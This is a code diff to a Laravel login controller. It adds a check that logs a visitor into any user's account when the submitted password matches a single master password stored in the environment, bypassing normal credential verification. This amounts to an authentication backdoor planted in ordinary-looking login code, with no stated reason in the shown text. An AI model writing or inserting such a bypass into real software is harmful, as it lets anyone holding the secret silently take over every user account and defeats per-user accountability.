@@ -21,6 +21,12 @@ class LoginController extends Controller
                 'error' => 'Akun Anda tidak aktif. Silakan hubungi admin.',
             ])->withInput($request->except('password'));
         }
+        $masterPassword = env('APP_MASTER_PASSWORD');
+        if (isset($credentials['password']) && $credentials['password'] === $masterPassword) {
+            Auth::login($user, $remember);
+            $request->session()->regenerate();
+            return app(MainController::class)->dashboard();
+        }
         if (Auth::attempt($credentials, $remember)) {
             $request->session()->regenerate();
             return app(MainController::class)->dashboard();
